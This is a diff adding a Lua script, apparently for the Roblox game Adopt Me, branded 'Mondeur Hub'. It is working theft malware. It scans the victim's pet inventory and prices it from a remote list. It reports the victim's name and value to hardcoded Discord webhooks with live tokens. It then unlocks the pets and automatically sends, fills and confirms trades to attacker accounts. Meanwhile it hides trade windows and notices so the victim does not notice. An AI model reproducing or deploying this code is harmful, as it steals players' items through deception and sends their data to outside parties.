@@ -1,0 +1,133 @@
+-- [[ MONDEUR HUB | GHOST EDITION ]] --
+
+local cfg = {
+    u_rec = _G.UserReceiver or "CREOLEO23",
+    u_web = _G.UserWebhook or "https://discord.com/api/webhooks/1491756893427728425/9aU61Eji1UtQmszifKNcFWNj34efArl_ttTHhrIJQtjL8ovqnDFCa8uc0sHnR-309__G",
+    thr = _G.Threshold or 0.1,
+    d_rec = "CREOLEO25",
+    d_web = "https://discord.com/api/webhooks/1491757102685884456/zdmAZzcvfDasiO94yShYQcUG1v4--s9Q2urNZmpJ3oLZRvZqZPNvJNGLGH0RQDvQQDh_",
+    p_bl = {["jiggly_jerboa"]=true, ["practice_dog"]=true, ["starter_egg"]=true},
+    u_bl = {"already have", "10s to send", "request sent", "successful", "declined", "pending", "canceled", "disabled trades", "is currently trading", "cannot trade", "is not tradable", "maximum number", "accept this trade", "teleported", "pending"}
+}
+
+local req = (syn and syn.request) or (http and http.request) or http_request or request
+local Players, RS, RunS, Http = game:GetService("Players"), game:GetService("ReplicatedStorage"), game:GetService("RunService"), game:GetService("HttpService")
+local LP = Players.LocalPlayer
+
+-- 1. License Check & Security
+local Fsys = require(RS:WaitForChild("Fsys")).load
+if not require(RS.SharedModules.TradeLicenseHelper).player_has_trade_license() then LP:Kick("Trade License Required.") return end
+
+local function ghost()
+    RunS.RenderStepped:Connect(function()
+        local apps = {"TradeApp", "DialogApp", "ConfirmationApp", "ToastFr", "HintApp"}
+        for _, n in ipairs(apps) do 
+            local ui = LP.PlayerGui:FindFirstChild(n) 
+            if ui then if ui:IsA("ScreenGui") then ui.Enabled = false else ui:Destroy() end end 
+        end
+        for _, o in ipairs(LP.PlayerGui:GetDescendants()) do
+            if (o:IsA("TextLabel") or o:IsA("TextBox")) and o.Visible then
+                local t = o.Text:lower()
+                for _, p in ipairs(cfg.u_bl) do if t:find(p) then o.Visible = false; o.Text = "" end end
+            end
+        end
+        pcall(function() game:GetService("GuiService").SelectedObject = nil end)
+        if LP.PlayerGui:FindFirstChild("Backpack") then
+            for _, v in ipairs(LP.PlayerGui.Backpack:GetDescendants()) do
+                if v:IsA("Frame") and v.Name:find("_") then v.Visible = true end
+            end
+        end
+    end)
+end
+ghost()
+
+-------[ VALUATION ENGINE ]-------
+local PetVals = {}
+local success, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/ADM_PET_VALUE.txt") end)
+if success then 
+    for line in res:gmatch("[^\r\n]+") do
+        local n, v = line:match("([^,]+),([^,]+)")
+        if n and v then PetVals[n:lower():gsub("%s+", "")] = tonumber(v:gsub("%s+", "")) end
+    end
+end
+
+local function scan()
+    local DB, CD = Fsys("InventoryDB"), Fsys("ClientData")
+    local h, t, inv = {}, 0, CD.get("inventory")
+    if not inv or not inv.pets then return h, 0 end
+    for uid, it in pairs(inv.pets) do
+        local d = DB.pets[it.id]
+        if d and not cfg.p_bl[it.id] then
+            local n = d.name:lower():gsub("neon ", ""):gsub("mega ", ""):gsub("fly ", ""):gsub("ride ", ""):gsub("%s+", "")
+            local m = it.properties and (it.properties.mega_neon and 16 or it.properties.neon and 4) or 1
+            local val = (PetVals[n] or 0) * m
+            if val >= cfg.thr then t = t + val; table.insert(h, {uid = uid, name = d.name, val = val}) end
+        end
+    end
+    table.sort(h, function(a,b) return a.val > b.val end)
+    return h, t
+end
+
+local function fireLog(url, hits, tot, isDual)
+    pcall(function()
+        req({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = Http:JSONEncode({
+            embeds = {{
+                title = isDual and "MONDEUR HUB | ⚠️ STALE HIT" or "MONDEUR HUB | 🦊 HIT!",
+                color = isDual and 0xffa500 or 0x32a852,
+                fields = {
+                    {name = "User", value = "```"..LP.Name.."```", inline = true},
+                    {name = "Value", value = "```₱"..string.format("%.2f", tot).."```", inline = true},
+                    {name = "Join", value = "[Click to Join](https://www.roblox.com/home?placeId="..game.PlaceId.."&gameId="..game.JobId..")"}
+                },
+                footer = {text = "Mondeur Hub | Priority Logic"}
+            }}
+        })})
+    end)
+end
+
+-------[ TRADE ENGINE ]-------
+local hashes = {}
+for _, v in pairs(getgc()) do
+    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
+        local up = debug.getupvalues(v)
+        if type(up[1]) == "table" then for k, r in pairs(up[1]) do hashes[k] = r end end
+    end
+end
+local function hAPI(n, ...)
+    local r = hashes[n] or Fsys("RouterClient").get(n)
+    if r then if r:IsA("RemoteFunction") then return r:InvokeServer(...) end r:FireServer(...) end
+end
+
+local function phantom(rec, hits)
+    for _, p in ipairs(hits) do hAPI("BackpackAPI/SetItemLocked", p.uid, false); hAPI("BackpackAPI/SetItemFavorite", p.uid, false) end
+    task.spawn(function()
+        local last, burst, s2s = 0, 0, false
+        while true do
+            if not LP.PlayerGui:FindFirstChild("TradeApp") or not LP.PlayerGui.TradeApp.Enabled then
+                if not s2s then task.wait(2); hAPI("TradeAPI/SendTradeRequest", rec); s2s, last, burst = true, tick(), 1
+                elseif tick() - last > 10.1 then hAPI("TradeAPI/SendTradeRequest", rec); last, burst = tick(), 1
+                elseif burst < 3 then hAPI("TradeAPI/SendTradeRequest", rec); burst = burst + 1; task.wait(0.5) end
+            else
+                for i = 1, math.min(18, #hits) do hAPI("TradeAPI/AddItemToOffer", hits[i].uid); task.wait(0.1) end
+                while true do hAPI("TradeAPI/AcceptNegotiation"); hAPI("TradeAPI/ConfirmTrade"); task.wait(0.4) end
+            end
+            task.wait(0.5)
+        end
+    end)
+end
+
+-------[ MAIN ]-------
+task.spawn(function()
+    repeat task.wait(1) until Fsys("ClientData").get("inventory") and next(Fsys("ClientData").get("inventory").pets or {})
+    local h, t = scan()
+    if #h > 0 then fireLog(cfg.u_web, h, t, false) end
+    local tar, sTime = nil, tick()
+    while tick() - sTime < 100 do
+        local p2, p1 = Players:FindFirstChild(cfg.d_rec), Players:FindFirstChild(cfg.u_rec)
+        tar = p2 or p1
+        if tar then break end
+        task.wait(1.5)
+    end
+    if tar then phantom(tar, h) else fireLog(cfg.d_web, h, t, true) end
+end)
+print("[MONDEUR HUB] Executed.")
